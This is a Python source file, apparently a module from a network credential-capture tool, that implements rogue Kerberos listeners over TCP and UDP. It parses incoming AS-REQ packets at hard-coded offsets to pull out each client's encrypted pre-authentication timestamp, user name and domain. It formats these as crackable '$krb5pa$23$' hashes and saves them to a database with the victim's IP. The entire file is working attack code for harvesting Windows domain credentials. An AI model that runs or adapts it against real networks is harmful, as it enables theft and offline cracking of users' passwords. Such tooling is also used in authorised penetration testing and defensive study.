from socketserver import BaseRequestHandler
from utils import *
import struct

def ParseMSKerbv5TCP(Data):
	MsgType     = Data[21:22]
	EncType     = Data[43:44]
	MessageType = Data[32:33]

	if MsgType == "\x0a" and EncType == "\x17" and MessageType =="\x02":
		if Data[49:53] == "\xa2\x36\x04\x34" or Data[49:53] == "\xa2\x35\x04\x33":
			HashLen = struct.unpack('<b',Data[50:51])[0]
			if HashLen == 54:
				Hash       = Data[53:105]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen    = struct.unpack('<b',Data[153:154])[0]
				Name       = Data[154:154+NameLen]
				DomainLen  = struct.unpack('<b',Data[154+NameLen+3:154+NameLen+4])[0]
				Domain     = Data[154+NameLen+4:154+NameLen+4+DomainLen]
				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash

		if Data[44:48] == "\xa2\x36\x04\x34" or Data[44:48] == "\xa2\x35\x04\x33":
			HashLen = struct.unpack('<b',Data[45:46])[0]
			if HashLen == 53:
				Hash       = Data[48:99]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen    = struct.unpack('<b',Data[147:148])[0]
				Name       = Data[148:148+NameLen]
				DomainLen  = struct.unpack('<b',Data[148+NameLen+3:148+NameLen+4])[0]
				Domain     = Data[148+NameLen+4:148+NameLen+4+DomainLen]
				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
			elif HashLen == 54:
				Hash       = Data[53:105]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen    = struct.unpack('<b',Data[148:149])[0]
				Name       = Data[149:149+NameLen]
				DomainLen  = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
				Domain     = Data[149+NameLen+4:149+NameLen+4+DomainLen]
				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
		else:
			Hash       = Data[48:100]
			SwitchHash = Hash[16:]+Hash[0:16]
			NameLen    = struct.unpack('<b',Data[148:149])[0]
			Name       = Data[149:149+NameLen]
			DomainLen  = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
			Domain     = Data[149+NameLen+4:149+NameLen+4+DomainLen]
			BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
			return BuildHash
	return False

def ParseMSKerbv5UDP(Data):
	MsgType = Data[17:18]
	EncType = Data[39:40]

	if MsgType == "\x0a" and EncType == "\x17":
		if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
			HashLen = struct.unpack('<b',Data[41:42])[0]
			if HashLen == 54:
				Hash       = Data[44:96]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen    = struct.unpack('<b',Data[144:145])[0]
				Name       = Data[145:145+NameLen]
				DomainLen  = struct.unpack('<b',Data[145+NameLen+3:145+NameLen+4])[0]
				Domain     = Data[145+NameLen+4:145+NameLen+4+DomainLen]
				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
			elif HashLen == 53:
				Hash       = Data[44:95]
				SwitchHash = Hash[16:]+Hash[0:16]
				NameLen    = struct.unpack('<b',Data[143:144])[0]
				Name       = Data[144:144+NameLen]
				DomainLen  = struct.unpack('<b',Data[144+NameLen+3:144+NameLen+4])[0]
				Domain     = Data[144+NameLen+4:144+NameLen+4+DomainLen]
				BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
				return BuildHash
		else:
			Hash       = Data[49:101]
			SwitchHash = Hash[16:]+Hash[0:16]
			NameLen    = struct.unpack('<b',Data[149:150])[0]
			Name       = Data[150:150+NameLen]
			DomainLen  = struct.unpack('<b',Data[150+NameLen+3:150+NameLen+4])[0]
			Domain     = Data[150+NameLen+4:150+NameLen+4+DomainLen]
			BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
			return BuildHash
	return False

class KerbTCP(BaseRequestHandler):
	def handle(self):
		data = self.request.recv(1024)
		KerbHash = ParseMSKerbv5TCP(data)

		if KerbHash:
			n, krb, v, name, domain, d, h = KerbHash.split('$')

			SaveToDb({
				'module': 'KERB',
				'type': 'MSKerbv5',
				'client': self.client_address[0],
				'user': domain+'\\'+name,
				'hash': h,
				'fullhash': KerbHash,
			})

class KerbUDP(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		KerbHash = ParseMSKerbv5UDP(data)

		if KerbHash:
			(n, krb, v, name, domain, d, h) = KerbHash.split('$')

			SaveToDb({
				'module': 'KERB',
				'type': 'MSKerbv5',
				'client': self.client_address[0],
				'user': domain+'\\'+name,
				'hash': h,
				'fullhash': KerbHash,
			})